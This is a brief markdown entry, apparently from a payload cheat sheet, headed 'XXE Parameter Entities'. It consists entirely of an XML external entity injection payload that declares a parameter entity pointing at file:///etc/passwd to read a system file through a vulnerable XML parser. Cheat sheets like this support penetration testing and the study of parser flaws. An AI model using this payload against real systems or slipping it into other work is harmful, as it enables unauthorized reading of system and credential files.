## 🔄 XXE Parameter Entities

```xml
<!-- Parameter entities (use % instead of &) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
```

